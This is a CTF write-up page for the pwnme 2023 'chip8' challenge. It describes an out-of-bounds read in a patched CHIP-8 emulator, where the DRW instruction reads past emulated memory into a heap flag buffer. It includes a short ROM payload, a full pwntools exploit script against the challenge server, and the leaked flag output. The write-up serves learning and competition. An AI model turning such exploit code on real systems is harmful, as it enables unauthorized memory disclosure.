@@ -1,0 +1,391 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>[pwnme 2023] chip8 // ret2school</title>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="nasm" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
+
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
+}
+</script>
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="[pwnme 2023] chip8"/>
+<meta name="twitter:description" content="chip8  Solves: 24 Easy
+I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC. You must find a way to get the flag in memory on the remote service !
+Author: Express#8049
+Remote service at : nc 51.254.39.184 1337
+ chip8 is a emulator-pwn challenge I did during the pwnme CTF . You can find the related files here."/>
+
+    <meta property="og:title" content="[pwnme 2023] chip8" />
+<meta property="og:description" content="chip8  Solves: 24 Easy
+I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC. You must find a way to get the flag in memory on the remote service !
+Author: Express#8049
+Remote service at : nc 51.254.39.184 1337
+ chip8 is a emulator-pwn challenge I did during the pwnme CTF . You can find the related files here." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ret2school.github.io/post/chip8/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-05-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-05-08T00:00:00+00:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://ret2school.github.io"><img class="app-header-avatar" src="/pic.jpeg" alt="nasm" /></a>
+      <h1>ret2school</h1>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             / 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Just a bunch of french ctf players</p>
+      <div class="app-header-social">
+        
+          <a target="_blank" href="https://github.com/ret2school" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg></a>
+        
+          <a target="_blank" href="https://twitter.com/ret2school_fr" rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg></a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">[pwnme 2023] chip8</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 8, 2023
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          8 min read
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line>
+</svg>
+              <a class="tag" href="https://ret2school.github.io/tags/ctf/">ctf</a>
+              <a class="tag" href="https://ret2school.github.io/tags/nasm/">nasm</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwn/">pwn</a>
+              <a class="tag" href="https://ret2school.github.io/tags/linux/">linux</a>
+              <a class="tag" href="https://ret2school.github.io/tags/pwnme/">pwnme</a>
+              <a class="tag" href="https://ret2school.github.io/tags/chip8/">chip8</a>
+              <a class="tag" href="https://ret2school.github.io/tags/emulator/">emulator</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="chip8">chip8</h2>
+<blockquote>
+<p>Solves: 24  Easy</p>
+<p>I just found a repo of a chip-8 emulator, it may be vulnerable but I didn&rsquo;t had enough time to report the vulnerability with a working PoC.
+You must find a way to get the flag in memory on the remote service !</p>
+<p>Author: Express#8049</p>
+<p>Remote service at : nc 51.254.39.184 1337</p>
+</blockquote>
+<p>chip8 is a emulator-pwn challenge I did during the <a href="https://pwnme.fr/">pwnme CTF</a> . You can find the related files <a href="https://github.com/ret2school/ctf/tree/master/2023/pwnme/pwn/chip8">here</a>.</p>
+<h2 id="code-review">Code review</h2>
+<p>This challenge is based on an emulator called <a href="https://github.com/LakshyAAAgrawal/chip8emu">c8emu</a> that is updated with these lines of code:</p>
+<pre tabindex="0"><code>diff --git a/include/Machine.hpp b/include/Machine.hpp
+index af3d0d7..4288e15 100644
+--- a/include/Machine.hpp
++++ b/include/Machine.hpp
+@@ -17,6 +17,7 @@ class Machine{
+ private:
+ 	std::vector&lt;uint8_t&gt; registers; // V0-VF
+ 	std::vector&lt;uint8_t&gt; memory; // Memory
++	std::vector&lt;uint8_t&gt; flag;
+ 	uint16_t I; // Index register
+ 	std::vector&lt;uint16_t&gt; stack; // Stack
+ 	uint8_t SP; // Stack Pointer
+diff --git a/src/Machine.cpp b/src/Machine.cpp
+index d34680e..2321296 100644
+--- a/src/Machine.cpp
++++ b/src/Machine.cpp
+@@ -6,10 +6,13 @@
+ #include &lt;chrono&gt;
+ #include &lt;thread&gt;
+ 
++std::string FLAG = &quot;PWNME{THIS_IS_A_SHAREHOLDER_AAAAAAAAAAAAAAAAAA}&quot;;
++
+ Machine::Machine(){
+ 	registers = std::vector&lt;uint8_t&gt;(16, 0);
+ 	stack = std::vector&lt;uint16_t&gt;(32, 0);
+ 	memory = std::vector&lt;uint8_t&gt;(4096, 0);
++	flag = std::vector&lt;uint8_t&gt;(128, 0);
+ 	PC = 0x200;
+ 	last_tick = std::chrono::steady_clock::now();
+ 	I = 0;
+@@ -134,8 +137,8 @@ void Machine::execute(uint16_t&amp; opcode){
+
+ 	if(it != first_match.end()) (it-&gt;second)(opcode);
+ 	else {
+-		std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;
+-		std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;
++		//std::cout &lt;&lt; &quot;No match found for opcode &quot; &lt;&lt; std::hex &lt;&lt; (int) opcode &lt;&lt; &quot;\n&quot;;
++		//std::cout &lt;&lt; &quot;This could be because this ROM uses SCHIP or another extension which is not yet supported.\n&quot;;
+ 		std::exit(0);
+ 	}
+ }
+@@ -179,12 +182,13 @@ void Machine::print_machine_state(){
+ }
+ 
+ void Machine::runLoop(){
++	std::copy(FLAG.begin(), FLAG.end(), flag.begin());
+ 	while(true){
+ 		// Update display
+ 		if(ge.is_dirty()){ // Check if the screen has to be updated
+ 			ge.update_display();
+-			print_machine_state();
+-			std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;
++			//print_machine_state();
++			//std::cout &lt;&lt; &quot;Opcode &quot; &lt;&lt; ((uint16_t) (memory[PC]&lt;&lt;8) | (memory[PC+1])) &lt;&lt; &quot;\n&quot;;
+ 		}
+ 
+ 		// Update the keyboard buffer to check for all pressed keys
+diff --git a/src/c8emu.cpp b/src/c8emu.cpp
+index e65123b..590228e 100644
+--- a/src/c8emu.cpp
++++ b/src/c8emu.cpp
+@@ -17,6 +17,10 @@ void loadFile(const std::string&amp; filename, std::vector&lt;uint8_t&gt;&amp; prog){
+ int main(int argc, char ** argv){
+ 	Machine machine;
+ 
++	setbuf(stdin, NULL);
++	setbuf(stdout, NULL);
++	setbuf(stderr, NULL);
++
+ 	{ // Create block to deallocate the possibly large variable prog
+ 		// Load Instructions
+ 		std::vector&lt;uint8_t&gt; prog;
+</code></pre><p>As you can see above, the prints that can leak informations about the program execution are removed, and an array named <code>flag</code> (on the heap) is inserted right after the memory mapping of length <code>0x1000</code> (on the heap) of the chip8 program. This way the goal would be to be able to leak the content of <code>flag</code> onto the screen.</p>
+<h2 id="few-words-on-chip8-architecture">few words on chip8 architecture</h2>
+<p>To get a quick overview of the chip8 arch, I advice you to read <a href="http://devernay.free.fr/hacks/chip8/C8TECH10.HTM#0.0">this</a>. Here are the most important informations from the technical reference:</p>
+<ul>
+<li>Chip-8 is a simple, interpreted, programming language which was first used on some do-it-yourself computer systems in the late 1970s and early 1980s. The COSMAC VIP, DREAM 6800, and ETI 660 computers are a few examples. These computers typically were designed to use a television as a display, had between 1 and 4K of RAM, and used a 16-key hexadecimal keypad for input. The interpreter took up only 512 bytes of memory, and programs, which were entered into the computer in hexadecimal, were even smaller.</li>
+<li>Chip-8 has 16 general purpose 8-bit registers, usually referred to as Vx, where x is a hexadecimal digit (0 through F). There is also a 16-bit register called I. This register is generally used to store memory addresses, so only the lowest (rightmost) 12 bits are usually used.</li>
+<li>Here are the instruction we need:
+<ul>
+<li><code>Annn</code> - <code>LD I, addr</code>. Set I = nnn. The value of register I is set to nnn.</li>
+<li><code>6xkk</code> - <code>LD Vx, byte</code>, Set Vx = kk. The interpreter puts the value kk into register Vx.</li>
+<li><code>Fx1E</code> - <code>ADD I, Vx</code>. Set I = I + Vx. The values of I and Vx are added, and the results are stored in I.</li>
+<li><code>Dxyn</code> - <code>DRW Vx, Vy, nibble</code>. Display n-byte sprite starting at memory location I at (Vx, Vy), set VF = collision. The interpreter reads n bytes from memory, starting at the address stored in I. These bytes are then displayed as sprites on screen at coordinates (Vx, Vy). Sprites are XORed onto the existing screen. If this causes any pixels to be erased, VF is set to 1, otherwise it is set to 0. If the sprite is positioned so part of it is outside the coordinates of the display, it wraps around to the opposite side of the screen. See instruction 8xy3 for more information on XOR, and section 2.4, Display, for more information on the Chip-8 screen and sprites.</li>
+</ul>
+</li>
+</ul>
+<pre tabindex="0"><code class="language-nnn" data-lang="nnn">n or nibble - A 4-bit value, the lowest 4 bits of the instruction
+x - A 4-bit value, the lower 4 bits of the high byte of the instruction
+y - A 4-bit value, the upper 4 bits of the low byte of the instruction
+kk or byte - An 8-bit value, the lowest 8 bits of the instruction 
+</code></pre><h2 id="the-bug">The bug</h2>
+<p>The bug lies into the implementation around the instruction that use the <code>I</code> register. Indeed, as you read above, the <code>I</code> register is 16 bits wide. Thus we could we print onto the screen with the help of the <code>DRW</code> instruction data stored from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>. Let&rsquo;s see how does it  handle the <code>DRW</code> instruction:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6272a4">// https://github.com/LakshyAAAgrawal/chip8emu/blob/master/src/Machine.cpp#L123
+</span><span style="color:#6272a4"></span>
+{<span style="color:#bd93f9">0xd000</span>, [this](<span style="color:#8be9fd">uint16_t</span><span style="color:#ff79c6">&amp;</span> op){ <span style="color:#6272a4">// TODO - Dxyn - DRW Vx, Vy, nibble
+</span><span style="color:#6272a4"></span>    registers[<span style="color:#bd93f9">0xf</span>] <span style="color:#ff79c6">=</span> ge.draw_sprite(memory.begin() <span style="color:#ff79c6">+</span> I, memory.begin() <span style="color:#ff79c6">+</span> I <span style="color:#ff79c6">+</span> (op <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x000f</span>), registers[(op <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x0f00</span>)<span style="color:#ff79c6">&gt;&gt;</span><span style="color:#bd93f9">8</span>] <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x40</span>, registers[(op <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0x00f0</span>)<span style="color:#ff79c6">&gt;&gt;</span><span style="color:#bd93f9">4</span>] <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">0x20</span>);
+}}
+</code></pre></div><p>The first and the second argument are the begin and the end of the location where data to print are stored. <code>(op &amp; 0x000f)</code> represents the amount of bytes we&rsquo;d like to print. As you can see no checks are performed, this way we able to get a read out of bound from from <code>memory[I=0]</code> up to <code>memory[I=2^16 - 1]</code>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>Now we now how we could exfiltrate the flag we can write this tiny chip8 program:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">code <span style="color:#ff79c6">=</span> [
+    <span style="color:#bd93f9">0xAFFF</span>, <span style="color:#6272a4"># Annn - LD I, addr, I  = 0xfff</span>
+    <span style="color:#bd93f9">0x6111</span>, <span style="color:#6272a4"># 6xkk - LD Vx, byte, R1 = 0x11</span>
+    <span style="color:#bd93f9">0xF11E</span>, <span style="color:#6272a4"># ADD I, R1, I =&gt; 0x1010</span>
+    <span style="color:#bd93f9">0xDBCF</span>  <span style="color:#6272a4"># Write on screen (xored with current pixels) 15 bytes from I=0x1010</span>
+]
+</code></pre></div><p>We read the flag from <code>memory[0x1010]</code> given <code>memory</code> is adjacent to the <code>flag</code> (<code>memory[0x1000]</code> == begin of the chunk <code>flag</code> within the heap), and we add <code>0x10</code> to read the chunk content which is right after the header (prev_sz and chunk_sz). Once we launch it we get:</p>
+<pre tabindex="0"><code>python3 exploit.py REMOTE HOST=51.254.39.184 PORT=1337
+[*] '/media/nasm/7044d811-e1cd-4997-97d5-c08072ce9497/ret2school/ctf/2023/pwnme/pwn/chip8/wrapper'
+    Arch:     amd64-64-little
+╔════════════════════════════════════════════════════════════════╗
+║ █ █ ▄▄▄                                                        ║
+║ █  ██▀▄                                                        ║
+║ █▄▄▄▀▄█                                                        ║
+║ █  ▄ ▀▀                                                        ║
+║ ▄██   ▀                                                        ║
+║  █▄█▀ ▀                                                        ║
+║ ▀▄█▀▀██                                                        ║
+║ ▀▀ ▀▀ ▀                                                        ║
+</code></pre><p>If we decode chars by hand (each byte is a line for which white is 1 and black zero), we get:</p>
+<pre tabindex="0"><code>╔════════════════════════════════════════════════════════════════╗
+║ █ █ ▄▄▄                                                        ║PW
+║ █  ██▀▄                                                        ║NM
+║ █▄▄▄▀▄█                                                        ║E{
+║ █  ▄ ▀▀                                                        ║CH
+║ ▄██   ▀                                                        ║18
+║  █▄█▀ ▀                                                        ║-8
+║ ▀▄█▀▀██                                                        ║_3
+║ ▀▀ ▀▀ ▀                                                         m
+</code></pre><p>If we repeat this step 4 times (by incrementing the value of V1), we finally managed to get the flag: <code>PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}</code>.</p>
+<h2 id="full-exploit">Full exploit</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#6272a4"># this exploit was generated via</span>
+<span style="color:#6272a4"># 1) pwntools</span>
+<span style="color:#6272a4"># 2) ctfmate</span>
+
+<span style="color:#ff79c6">import</span> os
+<span style="color:#ff79c6">import</span> time
+<span style="color:#ff79c6">import</span> pwn
+
+BINARY <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;wrapper&#34;</span>
+LIBC <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/usr/lib/x86_64-linux-gnu/libc.so.6&#34;</span>
+LD <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/lib64/ld-linux-x86-64.so.2&#34;</span>
+
+<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
+exe <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(BINARY)
+libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LIBC)
+ld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LD)
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;tmux&#34;</span>, <span style="color:#f1fa8c">&#34;splitw&#34;</span>, <span style="color:#f1fa8c">&#34;-h&#34;</span>]
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
+p64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64
+u64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64
+p32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p32
+u32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u32
+p16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p16
+u16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u16
+p8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p8
+u8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u8
+
+host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
+port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
+    <span style="color:#ff79c6">return</span> io
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
+        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span><span style="color:#f1fa8c">source ~/Downloads/pwndbg/gdbinit.py
+</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())
+
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>endianness <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;big&#39;</span>
+
+STEP<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">exp</span>():
+    io <span style="color:#ff79c6">=</span> start()
+
+    <span style="color:#6272a4"># every registers are zero-ed at the begin of the program</span>
+    code <span style="color:#ff79c6">=</span> [
+        <span style="color:#bd93f9">0xAFFF</span>, <span style="color:#6272a4"># Annn - LD I, addr, I  = 0xfff</span>
+		<span style="color:#bd93f9">0x6111</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xf</span><span style="color:#ff79c6">*</span>STEP, <span style="color:#6272a4"># 6xkk - LD Vx, byte, R1 = 0x1F</span>
+        <span style="color:#bd93f9">0xF11E</span>, <span style="color:#6272a4"># ADD I, R1, I =&gt; 0x101F</span>
+		<span style="color:#bd93f9">0xDBCF</span>  <span style="color:#6272a4"># Write on screen (xored with current pixels) 15 bytes from I</span>
+    ]
+
+    code_to_send <span style="color:#ff79c6">=</span> [pwn<span style="color:#ff79c6">.</span>p16(k) <span style="color:#ff79c6">for</span> k <span style="color:#ff79c6">in</span> code]
+
+    io<span style="color:#ff79c6">.</span>sendafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Enter ROM code: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join(code_to_send))
+    io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+
+    io<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>)
+
+    io<span style="color:#ff79c6">.</span>interactive()
+
+<span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
+    exp()
+
+<span style="color:#f1fa8c">&#34;&#34;&#34;
+</span><span style="color:#f1fa8c">PWNME{CH1p-8_3mu14t0r_1s_h4Ck4bl3_1n_2023_y34h}
+</span><span style="color:#f1fa8c">╔════════════════════════════════════════════════════════════════╗
+</span><span style="color:#f1fa8c">║ █ █ ▄▄▄                                                        ║PW
+</span><span style="color:#f1fa8c">║ █  ██▀▄                                                        ║NM
+</span><span style="color:#f1fa8c">║ █▄▄▄▀▄█                                                        ║E{
+</span><span style="color:#f1fa8c">║ █  ▄ ▀▀                                                        ║CH
+</span><span style="color:#f1fa8c">║ ▄██   ▀                                                        ║18
+</span><span style="color:#f1fa8c">║  █▄█▀ ▀                                                        ║-8
+</span><span style="color:#f1fa8c">║ ▀▄█▀▀██                                                        ║_3
+</span><span style="color:#f1fa8c">║ ▀▀ ▀▀ ▀                                                         m
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">second part
+</span><span style="color:#f1fa8c">╔════════════════════════════════════════════════════════════════╗
+</span><span style="color:#f1fa8c">║ ██▄▀█ █                                                        ║mu
+</span><span style="color:#f1fa8c">║  ██ ▄ ▀                                                        ║14
+</span><span style="color:#f1fa8c">║ ▀██ ▀                                                          ║t0
+</span><span style="color:#f1fa8c">║ █▀█▄▄█▄                                                        ║r_
+</span><span style="color:#f1fa8c">║ ▄██  ▄█                                                        ║1s
+</span><span style="color:#f1fa8c">║ █▄▀█▀▀▀                                                        ║_h
+</span><span style="color:#f1fa8c">║ ▄▀▀ ▀▄▄                                                        ║4C
+</span><span style="color:#f1fa8c">║ ▀▀ ▀ ▀▀                                                        ║k
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">part three:
+</span><span style="color:#f1fa8c">════════════════════════════════════════════════════════════════╗
+</span><span style="color:#f1fa8c">║ ▄█▀ ▀▄                                                         ║4b
+</span><span style="color:#f1fa8c">║ ▀█▄▀▀▄▄                                                        ║l3
+</span><span style="color:#f1fa8c">║ ▀▄█▀▀▀█                                                        ║_1
+</span><span style="color:#f1fa8c">║ █▀▄███▄                                                        ║n_
+</span><span style="color:#f1fa8c">║  ██  ▀                                                         ║20
+</span><span style="color:#f1fa8c">║  ██  █▄                                                        ║23
+</span><span style="color:#f1fa8c">║ █▄██▀▀█                                                        ║_y
+</span><span style="color:#f1fa8c">║  ▀▀  ▀▀                                                         3
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">part four
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">║ ▄█▀▄▀                                                          ║4h
+</span><span style="color:#f1fa8c">║ ▀▀▀▀▀ ▀                                                        ║}
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">
+</span><span style="color:#f1fa8c">&#34;&#34;&#34;</span>
+</code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
